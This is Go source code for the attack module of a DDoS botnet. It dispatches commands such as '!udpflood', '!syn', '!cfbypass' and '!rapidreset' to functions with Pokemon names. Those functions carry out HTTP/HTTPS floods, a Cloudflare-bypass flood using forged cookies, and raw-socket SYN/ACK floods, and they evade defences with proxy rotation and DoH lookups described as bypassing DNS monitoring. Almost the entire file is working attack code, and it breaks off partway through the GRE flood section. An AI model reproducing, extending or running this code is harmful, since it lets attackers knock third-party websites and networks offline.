//go:build withattacks

package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

)

const hasAttacks = true

// ============================================================================
// ATTACK CONTROL FUNCTIONS
// ============================================================================

// pikachu stops all running attacks by closing the stop channel.
// Creates a new stop channel for future attacks.
// Thread-safe using aptStopMutex.
func pikachu() {
	aptStopMutex.Lock()
	defer aptStopMutex.Unlock()
	if aptAttackRunning {
		close(aptStopChan)
		aptStopChan = make(chan struct{})
		aptAttackRunning = false
	}
}

// raichu returns the current stop channel and marks an attack as running.
// All attack goroutines should select on this channel to enable graceful termination.
// Returns: Channel that will be closed when attack should stop
func raichu() chan struct{} {
	aptStopMutex.Lock()
	defer aptStopMutex.Unlock()
	aptAttackRunning = true
	return aptStopChan
}

// dispatchAttackStop stops all running attacks (called by blackEnergy for !stop).
func dispatchAttackStop() {
	pikachu()
}

// dispatchAttack handles all flood/DDoS commands routed from blackEnergy.
func dispatchAttack(conn net.Conn, cmd string, fields []string) error {
	useProxy := false
	proxyURL := ""
	minFields := 4

	if (cmd == "!http" || cmd == "!https" || cmd == "!tls" || cmd == "!cfbypass" || cmd == "!rapidreset") && len(fields) >= 6 {
		if fields[4] == "-pu" {
			proxyURL = fields[5]
			proxies, err := fetchProxyList(proxyURL)
			if err != nil || len(proxies) == 0 {
				conn.Write([]byte(fmt.Sprintf("ERROR: Failed to fetch proxies: %v\n", err)))
				return nil
			}
			useProxy = true
			proxyListMutex.Lock()
			proxyList = proxies
			proxyListMutex.Unlock()
			deoxys("Loaded %d proxies from %s (no validation)", len(proxies), proxyURL)
		}
	}

	if len(fields) < minFields {
		return fmt.Errorf("invalid format")
	}
	target := fields[1]
	targetPort, err := strconv.Atoi(fields[2])
	if err != nil || targetPort <= 0 || targetPort > 65535 {
		return fmt.Errorf("invalid port: %s", fields[2])
	}
	duration, err := strconv.Atoi(fields[3])
	if err != nil || duration < 5 {
		return fmt.Errorf("invalid duration (min 5s): %s", fields[3])
	}
	switch cmd {
	case "!udpflood":
		go snorlax(target, targetPort, duration)
	case "!tcpflood":
		go gengar(target, targetPort, duration)
	case "!http":
		if useProxy {
			go alakazamProxy(target, targetPort, duration, true)
			return nil
		}
		go alakazam(target, targetPort, duration)
	case "!https", "!tls":
		if useProxy {
			go machampProxy(target, targetPort, duration, true)
			return nil
		}
		go machamp(target, targetPort, duration)
	case "!cfbypass":
		if useProxy {
			go gyaradosProxy(target, targetPort, duration, true)
			return nil
		}
		go gyarados(target, targetPort, duration)
	case "!syn":
		go dragonite(target, targetPort, duration)
	case "!ack":
		go tyranitar(target, targetPort, duration)
	case "!gre":
		go metagross(target, duration)
	case "!dns":
		go salamence(target, targetPort, duration)
	case "!rapidreset":
		if useProxy {
			go darkraiProxy(target, targetPort, duration, true)
			return nil
		}
		go arkrai(target, targetPort, duration)
	}
	return nil
}

// ============================================================================
// PROXY SUPPORT FUNCTIONS
// These enable L7 attacks through HTTP/HTTPS proxies for IP rotation.
// Bot fetches proxy list directly and rotates without validation for max RPS.
// ============================================================================

// proxyIndex tracks current position for round-robin proxy rotation
var proxyIndex int32

// fetchProxyList downloads and parses a proxy list from a URL.
// No validation - just fetch and use for maximum speed.
// Supports formats: ip:port, http://ip:port, https://ip:port
func fetchProxyList(proxyURL string) ([]string, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(proxyURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("status: %d", resp.StatusCode)
	}

	var proxies []string
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		// Ensure http:// prefix
		if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
			line = "http://" + line
		}
		proxies = append(proxies, line)
	}
	return proxies, scanner.Err()
}

// persian returns the next proxy using round-robin rotation.
// Uses atomic increment for thread-safe rotation without lock contention.
// Returns: Next proxy URL string, or empty string if no proxies loaded
func persian() string {
	proxyListMutex.RLock()
	defer proxyListMutex.RUnlock()
	if len(proxyList) == 0 {
		return ""
	}
	// Round-robin rotation for even distribution across all proxies
	idx := atomic.AddInt32(&proxyIndex, 1)
	return proxyList[int(idx)%len(proxyList)]
}

// meowstic creates an HTTP client configured to use a proxy.
// Uses very short timeout to avoid getting stuck on bad proxies.
// Parameters:
//   - proxyAddr: Proxy URL (http://ip:port or http://user:pass@ip:port)
//   - timeout: Request timeout duration (ignored, uses 2s for max speed)
//
// Returns: Configured HTTP client or error
func meowstic(proxyAddr string, timeout time.Duration) (*http.Client, error) {
	proxyURL, err := url.Parse(proxyAddr)
	if err != nil {
		return nil, err
	}

	// Use the caller's timeout (default short to skip bad proxies fast)
	shortTimeout := timeout
	if shortTimeout <= 0 {
		shortTimeout = 2 * time.Second
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		},
		DisableKeepAlives:     true, // Don't reuse connections with proxies
		MaxIdleConns:          0,
		IdleConnTimeout:       1 * time.Second,
		ResponseHeaderTimeout: shortTimeout,
		DialContext: (&net.Dialer{
			Timeout:   shortTimeout,
			KeepAlive: 0,
		}).DialContext,
		TLSHandshakeTimeout: shortTimeout,
	}

	return &http.Client{
		Transport: transport,
		Timeout:   shortTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			if len(via) >= 3 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}, nil
}

// magikarp is a struct for parsing DNS-over-HTTPS JSON responses.
// Used by lucario for domain resolution via DoH when system DNS fails.
type magikarp struct {
	Answer []struct {
		Data string `json:"data"`
	} `json:"Answer"`
}

// lucario resolves a target hostname to an IP address.
// Resolution order: direct IP passthrough -> Cloudflare DoH -> system DNS
// DoH is prioritized to bypass local DNS filtering/monitoring.
// Parameters:
//   - target: IP address or hostname (may include http:// prefix or port)
//
// Returns: Resolved IP address string or error
func lucario(target string) (string, error) {
	if net.ParseIP(target) != nil {
		return target, nil
	}
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")
	if idx := strings.Index(target, "/"); idx != -1 {
		target = target[:idx]
	}
	if idx := strings.Index(target, ":"); idx != -1 {
		target = target[:idx]
	}
	// Try Cloudflare DoH first (bypasses local DNS filtering)
	dohList := dohAttack
	for _, server := range dohList {
		url := fmt.Sprintf("%s?name=%s&type=A", server, target)
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Accept", dnsJsonAccept)
		client := &http.Client{Timeout: 5 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			continue
		}
		var dnsResp magikarp
		if err := json.NewDecoder(resp.Body).Decode(&dnsResp); err != nil {
			resp.Body.Close()
			continue
		}
		resp.Body.Close()
		if len(dnsResp.Answer) > 0 {
			return dnsResp.Answer[0].Data, nil
		}
	}
	// Fallback to system DNS resolver
	ips, err := net.LookupHost(target)
	if err == nil && len(ips) > 0 {
		return ips[0], nil
	}
	return "", fmt.Errorf("all resolution methods failed for: %s", target)
}

// uaTmpl defines a User-Agent template with a format string and version range.
// The format string uses %d placeholders for version numbers.
type uaTmpl struct {
	format   string
	versions []int
}

// uaPool replaces the former 546-entry hardcoded eevee array.
// Templates + version ranges produce equivalent diversity at ~1/10 the binary cost.
var uaPool = []uaTmpl{
	// Chrome — Windows
	{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", []int{135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125}},
	// Chrome — macOS
	{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", []int{135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125}},
	// Chrome — Linux
	{"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", []int{135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125}},
	// Chrome — Android Samsung
	{"Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Mobile Safari/537.36", []int{135, 134, 133, 132, 131, 130, 129}},
	// Chrome — Android Pixel
	{"Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Mobile Safari/537.36", []int{135, 134, 133, 132, 131, 130, 129}},
	// Firefox — Windows (version appears twice: rv:%d and Firefox/%d)
	{"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%d.0) Gecko/20100101 Firefox/%d.0", []int{138, 137, 136, 135, 134, 133, 132, 131, 130, 129}},
	// Firefox — macOS
	{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:%d.0) Gecko/20100101 Firefox/%d.0", []int{138, 137, 136, 135, 134, 133, 132, 131, 130, 129}},
	// Firefox — Linux
	{"Mozilla/5.0 (X11; Linux x86_64; rv:%d.0) Gecko/20100101 Firefox/%d.0", []int{138, 137, 136, 135, 134, 133, 132, 131, 130, 129}},
	// Edge — Windows
	{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36 Edg/%d.0.0.0", []int{135, 134, 133, 132, 131, 130, 129, 128, 127}},
	// Edge — macOS
	{"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36 Edg/%d.0.0.0", []int{135, 134, 133, 132, 131, 130, 129}},
	// Safari — macOS (maps os_minor → safari version: 15_1→19.1, 14_4→18.4, etc.)
	{"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.%d Safari/605.1.15", []int{3, 2, 1, 0}},
	{"Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.%d Safari/605.1.15", []int{1, 0}},
	// Safari — iOS iPhone
	{"Mozilla/5.0 (iPhone; CPU iPhone OS 18_%d like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.%d Mobile/15E148 Safari/604.1", []int{4, 3, 2, 1, 0}},
	{"Mozilla/5.0 (iPhone; CPU iPhone OS 17_%d like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.%d Mobile/15E148 Safari/604.1", []int{6, 5, 4, 3, 2, 1, 0}},
	// Safari — iPad
	{"Mozilla/5.0 (iPad; CPU OS 18_%d like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.%d Mobile/15E148 Safari/604.1", []int{4, 3, 2, 1, 0}},
	// Opera — Windows
	{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36 OPR/%d.0.0.0", []int{135, 134, 133, 132, 131, 130, 129}},
	// Brave — Windows
	{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36 Brave/%d", []int{135, 134, 133, 132, 131, 130, 129}},
	// Firefox — Android
	{"Mozilla/5.0 (Android 15; Mobile; rv:%d.0) Gecko/%d.0 Firefox/%d.0", []int{138, 137, 136, 135, 134, 133}},
}

// randUA builds a random User-Agent from the template pool.
func randUA() string {
	t := uaPool[rand.Intn(len(uaPool))]
	v := t.versions[rand.Intn(len(t.versions))]
	return fmt.Sprintf(t.format, v, v, v) // extra args ignored if format has fewer %d
}

// ============================================================================
// L7 (APPLICATION LAYER) ATTACK FUNCTIONS
// These perform HTTP/HTTPS floods to overwhelm web servers.
// ============================================================================

// alakazam performs HTTP flood attack (wrapper for alakazamProxy without proxy).
// Parameters:
//   - target: Target hostname or IP
//   - targetPort: Target port (typically 80)
//   - duration: Attack duration in seconds
func alakazam(target string, targetPort, duration int) {
	alakazamProxy(target, targetPort, duration, false)
}

// alakazamProxy performs HTTP POST flood with optional proxy rotation.
// Spawns workerPool (default 2024) concurrent workers sending POST requests.
// In proxy mode, rotates proxies periodically to avoid IP blocking.
// Parameters:
//   - target: Target hostname or IP
//   - targetPort: Target port (typically 80)
//   - duration: Attack duration in seconds
//   - useProxy: Enable proxy rotation from loaded proxy list
func alakazamProxy(target string, targetPort, duration int, useProxy bool) {

	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	resolvedIP, err := lucario(target)
	if err != nil {
		return
	}
	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)
	userAgents := shortUAs
	referers := refererList

	// Create shared transport for non-proxy mode (connection pooling)
	var sharedClient *http.Client
	if !useProxy {
		transport := &http.Transport{
			MaxIdleConns:        1000,
			MaxIdleConnsPerHost: 100,
			IdleConnTimeout:     30 * time.Second,
			DisableKeepAlives:   false,
		}
		sharedClient = &http.Client{
			Timeout:   10 * time.Second,
			Transport: transport,
		}
	}

	for i := 0; i < workerPool; i++ {
		wg.Add(1)
		guardedGo("alakazam", func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					var client *http.Client
					if useProxy {
						// Get next proxy in rotation (round-robin)
						proxyAddr := persian()
						if proxyAddr != "" {
							var err error
							client, err = meowstic(proxyAddr, 2*time.Second)
							if err != nil {
								continue // Skip to next iteration, try another proxy
							}
						} else {
							continue // No proxies available
						}
					} else {
						client = sharedClient
					}
					body := make([]byte, 1024)
					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
					resp, _ := client.Do(req)
					if resp != nil {
						resp.Body.Close()
					}
				}
			}
		})
	}
	wg.Wait()
}

// machamp performs HTTPS/TLS flood attack (wrapper for machampProxy without proxy).
// Parameters:
//   - target: Target hostname or IP
//   - targetPort: Target port (typically 443)
//   - duration: Attack duration in seconds
func machamp(target string, targetPort, duration int) {
	machampProxy(target, targetPort, duration, false)
}

// machampProxy performs HTTPS flood with TLS connection reuse and optional proxy support.
// Uses TLS 1.2-1.3 and sends multiple HTTP requests per connection.
// Randomizes: HTTP methods (GET/POST/HEAD), paths, and User-Agents.
// Parameters:
//   - target: Target hostname
//   - targetPort: Target port (typically 443)
//   - duration: Attack duration in seconds
//   - useProxy: Enable proxy mode using loaded proxy list
func machampProxy(target string, targetPort, duration int, useProxy bool) {

	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	hostname := target
	hostname = strings.TrimPrefix(hostname, "https://")
	hostname = strings.TrimPrefix(hostname, "http://")
	if idx := strings.Index(hostname, "/"); idx != -1 {
		hostname = hostname[:idx]
	}
	if idx := strings.Index(hostname, ":"); idx != -1 {
		hostname = hostname[:idx]
	}

	// For proxy mode, use HTTP client with proxy
	if useProxy {
		scheme := "https"
		targetURL := fmt.Sprintf("%s://%s:%d", scheme, hostname, targetPort)
		paths := httpPaths
		methods := []string{"GET", "POST", "HEAD"}

		for i := 0; i < workerPool; i++ {
			wg.Add(1)
			guardedGo("machamp-proxy", func() {
				defer wg.Done()
				for {
					select {
					case <-ctx.Done():
						return
					case <-stopCh:
						return
					default:
						// Get next proxy in rotation (round-robin) for every request
						proxyAddr := persian()
						if proxyAddr == "" {
							continue // No proxies available
						}
						client, err := meowstic(proxyAddr, 2*time.Second)
						if err != nil {
							continue // Skip bad proxy, try next
						}

						method := methods[rand.Intn(len(methods))]
						path := paths[rand.Intn(len(paths))]
						ua := randUA()
						reqURL := fmt.Sprintf("%s%s", targetURL, path)

						var req *http.Request
						if method == "POST" {
							body := turla(rand.Intn(1024) + 256)
							req, err = http.NewRequest(method, reqURL, strings.NewReader(body))
						} else {
							req, err = http.NewRequest(method, reqURL, nil)
						}
						if err != nil {
							continue
						}

						req.Header.Set("Host", hostname)
						req.Header.Set("User-Agent", ua)
						req.Header.Set("Accept", "text/html,application/xhtml+xml")
						req.Header.Set("Connection", "close")

						resp, _ := client.Do(req)
						if resp != nil {
							io.Copy(io.Discard, resp.Body)
							resp.Body.Close()
						}
						}
				}
			})
		}
		wg.Wait()
		return
	}

	// Original direct connection mode
	resolvedIP, err := lucario(target)
	if err != nil {
		return
	}
	targetAddr := fmt.Sprintf("%s:%d", resolvedIP, targetPort)
	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: hostname, MinVersion: tls.VersionTLS12, MaxVersion: tls.VersionTLS13}
	paths := httpPaths
	methods := []string{"GET", "POST", "HEAD"}
	for i := 0; i < workerPool; i++ {
		wg.Add(1)
		guardedGo("machamp-direct", func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					dialer := &net.Dialer{Timeout: 5 * time.Second}
					conn, err := tls.DialWithDialer(dialer, "tcp", targetAddr, tlsConfig)
					if err != nil {
						continue
					}
					for j := 0; j < 10; j++ {
						select {
						case <-ctx.Done():
							conn.Close()
							return
						case <-stopCh:
							conn.Close()
							return
						default:
						}
						method := methods[rand.Intn(len(methods))]
						path := paths[rand.Intn(len(paths))]
						ua := randUA()
						var reqBuilder strings.Builder
						reqBuilder.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
						reqBuilder.WriteString(fmt.Sprintf("Host: %s\r\n", hostname))
						reqBuilder.WriteString(fmt.Sprintf("User-Agent: %s\r\n", ua))
						reqBuilder.WriteString("Accept: text/html,application/xhtml+xml\r\n")
						reqBuilder.WriteString("Connection: keep-alive\r\n")
						if method == "POST" {
							body := turla(rand.Intn(1024) + 256)
							reqBuilder.WriteString(fmt.Sprintf("Content-Length: %d\r\n\r\n", len(body)))
							reqBuilder.WriteString(body)
						} else {
							reqBuilder.WriteString("\r\n")
						}
						conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
						if _, err := conn.Write([]byte(reqBuilder.String())); err != nil {
							break
						}
						}
					conn.Close()
				}
			}
		})
	}
	wg.Wait()
}

// ============================================================================
// SESSION MANAGEMENT FOR CF BYPASS
// These structs and functions manage HTTP sessions with cookie persistence.
// ============================================================================

// ditto represents a browser session with cookies and persistent User-Agent.
// Used for maintaining state across requests (required for Cloudflare bypass).
type ditto struct {
	cookies   []*http.Cookie // Collected cookies from responses
	userAgent string         // Consistent User-Agent for session
	client    *http.Client   // HTTP client with cookie jar
}

// zorua creates a new browser session with cookie support.
// Initializes an HTTP client with TLS config and cookie jar.
// Returns: Configured ditto session ready for requests
func zorua() *ditto {
	jar, _ := zoroark()
	return &ditto{
		cookies:   nil,
		userAgent: randUA(),
		client: &http.Client{
			Timeout: 30 * time.Second,
			Jar:     jar,
			Transport: &http.Transport{
				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
				DisableKeepAlives: false,
				MaxIdleConns:      100,
				IdleConnTimeout:   90 * time.Second,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
}

// zoruaWithProxy creates a browser session configured to use a proxy.
// Same as zorua but routes all requests through the specified proxy.
// Falls back to non-proxy session if proxy URL is invalid.
// Parameters:
//   - proxyAddr: Proxy URL (http://ip:port or with auth)
//
// Returns: Configured ditto session with proxy support
func zoruaWithProxy(proxyAddr string) *ditto {
	jar, _ := zoroark()
	proxyURL, err := url.Parse(proxyAddr)
	if err != nil {
		return zorua() // Fallback to non-proxy version
	}
	return &ditto{
		cookies:   nil,
		userAgent: randUA(),
		client: &http.Client{
			Timeout: 30 * time.Second,
			Jar:     jar,
			Transport: &http.Transport{
				Proxy:             http.ProxyURL(proxyURL),
				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
				DisableKeepAlives: false,
				MaxIdleConns:      100,
				IdleConnTimeout:   90 * time.Second,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
}

// zoruaWithProxyFast creates a browser session with very short timeouts for max RPS.
// No connection reuse, no keep-alive - just fire and forget for maximum throughput.
// Parameters:
//   - proxyAddr: Proxy URL (http://ip:port or with auth)
//
// Returns: Configured ditto session with fast proxy support
func zoruaWithProxyFast(proxyAddr string) *ditto {
	proxyURL, err := url.Parse(proxyAddr)
	if err != nil {
		return zorua() // Fallback to non-proxy version
	}
	shortTimeout := 2 * time.Second
	return &ditto{
		cookies:   nil,
		userAgent: randUA(),
		client: &http.Client{
			Timeout: shortTimeout,
			Transport: &http.Transport{
				Proxy:             http.ProxyURL(proxyURL),
				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
				DisableKeepAlives: true, // Don't reuse connections
				MaxIdleConns:      0,
				IdleConnTimeout:   1 * time.Second,
				DialContext: (&net.Dialer{
					Timeout:   shortTimeout,
					KeepAlive: 0,
				}).DialContext,
				TLSHandshakeTimeout:   shortTimeout,
				ResponseHeaderTimeout: shortTimeout,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 3 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
}

// zoroark creates a new cookie jar for session management.
// Returns: Thread-safe cookie jar implementation
func zoroark() (http.CookieJar, error) {
	return &mimikyu{cookies: make(map[string][]*http.Cookie)}, nil
}

// mimikyu implements http.CookieJar interface for storing cookies per host.
// Thread-safe using mutex for concurrent access.
type mimikyu struct {
	mu      sync.Mutex
	cookies map[string][]*http.Cookie
}

// SetCookies stores cookies for a URL's host.
func (j *mimikyu) SetCookies(u *url.URL, cookies []*http.Cookie) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.cookies[u.Host] = append(j.cookies[u.Host], cookies...)
}

// Cookies returns stored cookies for a URL's host.
func (j *mimikyu) Cookies(u *url.URL) []*http.Cookie {
	j.mu.Lock()
	defer j.mu.Unlock()
	return j.cookies[u.Host]
}

// gastly attempts to bypass Cloudflare protection by following the JS challenge flow.
// Makes initial request, waits if challenged (503/403), then retries with cookies.
// Parameters:
//   - targetURL: Full URL to access and bypass
//
// Returns: error if bypass fails
func (s *ditto) gastly(targetURL string) error {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", s.userAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	s.cookies = resp.Cookies()
	if resp.StatusCode == 503 || resp.StatusCode == 403 {
		time.Sleep(5 * time.Second)
		req2, _ := http.NewRequest("GET", targetURL, nil)
		req2.Header.Set("User-Agent", s.userAgent)
		for _, c := range s.cookies {
			req2.AddCookie(c)
		}
		resp2, err := s.client.Do(req2)
		if err != nil {
			return err
		}
		defer resp2.Body.Close()
		s.cookies = resp2.Cookies()
	}
	return nil
}

// gyarados performs Cloudflare bypass flood (wrapper for gyaradosProxy without proxy).
// Parameters:
//   - target: Target hostname
//   - targetPort: Target port (typically 443)
//   - duration: Attack duration in seconds
func gyarados(target string, targetPort, duration int) {
	gyaradosProxy(target, targetPort, duration, false)
}

// gyaradosProxy performs Cloudflare bypass flood with session management.
// Each worker maintains a persistent session with cookies.
// Attempts to solve CF JS challenges before flooding with requests.
// Adds fake __cf_bm cookies to appear as legitimate traffic.
// Parameters:
//   - target: Target hostname
//   - targetPort: Target port (typically 443)
//   - duration: Attack duration in seconds
//   - useProxy: Enable proxy rotation for each session
func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {

	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	hostname := target
	hostname = strings.TrimPrefix(hostname, "https://")
	hostname = strings.TrimPrefix(hostname, "http://")
	if idx := strings.Index(hostname, "/"); idx != -1 {
		hostname = hostname[:idx]
	}
	scheme := "https"
	if targetPort == 80 {
		scheme = "http"
	}
	_ = fmt.Sprintf("%s://%s:%d/", scheme, hostname, targetPort) // targetURL kept for reference
	paths := append(cfPaths, "/search?q="+turla(8))
	sessionWorkers := 50
	if workerPool < sessionWorkers {
		sessionWorkers = workerPool
	}
	for i := 0; i < sessionWorkers; i++ {
		wg.Add(1)
		guardedGo("gyarados", func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					var session *ditto
					if useProxy {
						// Get next proxy in rotation for every session
						proxyAddr := persian()
						if proxyAddr == "" {
							continue // No proxies available
						}
						session = zoruaWithProxyFast(proxyAddr)
					} else {
						session = zorua()
					}

					// Skip bypass attempt - just flood directly for max RPS
					path := paths[rand.Intn(len(paths))]
					reqURL := fmt.Sprintf("%s://%s:%d%s", scheme, hostname, targetPort, path)
					req, err := http.NewRequest("GET", reqURL, nil)
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", session.userAgent)
					req.Header.Set("Accept", "text/html,application/xhtml+xml")
					req.Header.Set("Connection", "close")
					req.AddCookie(&http.Cookie{Name: cfCookieName, Value: turla(32)})
					resp, _ := session.client.Do(req)
					if resp != nil {
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()
					}
				}
			}
		})
	}
	wg.Wait()
}

// ============================================================================
// L4 (TRANSPORT LAYER) ATTACK FUNCTIONS
// These perform raw packet floods to overwhelm network infrastructure.
// Require root/CAP_NET_RAW capability for raw socket access.
// ============================================================================

// serializeTCP builds a raw 20-byte TCP header in wire format.
func serializeTCP(srcPort, dstPort uint16, seq, ack uint32, flags byte, window uint16) []byte {
	hdr := make([]byte, 20)
	binary.BigEndian.PutUint16(hdr[0:2], srcPort)
	binary.BigEndian.PutUint16(hdr[2:4], dstPort)
	binary.BigEndian.PutUint32(hdr[4:8], seq)
	binary.BigEndian.PutUint32(hdr[8:12], ack)
	hdr[12] = 5 << 4 // data offset = 5 (20 bytes, no options)
	hdr[13] = flags
	binary.BigEndian.PutUint16(hdr[14:16], window)
	// hdr[16:18] = checksum (0, kernel fills for ip4:tcp)
	// hdr[18:20] = urgent pointer (0)
	return hdr
}

// dragonite performs a TCP SYN flood attack using raw sockets.
// Sends SYN packets with random source ports and sequence numbers.
// Maximum payload size to amplify bandwidth consumption.
// Parameters:
//   - targetIP: Target IP address or hostname
//   - targetPort: Target TCP port
//   - duration: Attack duration in seconds
func dragonite(targetIP string, targetPort, duration int) {

	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < workerPool; i++ {
		wg.Add(1)
		guardedGo("dragonite", func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					hdr := serializeTCP(uint16(rand.Intn(52024)+1024), uint16(targetPort), rand.Uint32(), 0, 0x02, 12800)
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					conn.WriteTo(append(hdr, payload...), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		})
	}
	wg.Wait()
}

// tyranitar performs a TCP ACK flood attack using raw sockets.
// ACK floods can bypass some SYN flood protections.
// Sends ACK packets with random sequence and acknowledgment numbers.
// Parameters:
//   - targetIP: Target IP address or hostname
//   - targetPort: Target TCP port
//   - duration: Attack duration in seconds
//
// Returns: error if target resolution fails
func tyranitar(targetIP string, targetPort int, duration int) error {

	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return err
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return fmt.Errorf("invalid IP")
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < workerPool; i++ {
		wg.Add(1)
		guardedGo("tyranitar", func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					hdr := serializeTCP(uint16(rand.Intn(64312)+1024), uint16(targetPort), rand.Uint32(), rand.Uint32(), 0x10, 12800)
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					conn.WriteTo(append(hdr, payload...), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		})
	}
	wg.Wait()
	return nil
}

// metagross performs a GRE (Generic Routing Encapsulation) protocol flood.
// GRE floods are effective against routers and can cause routing issues.
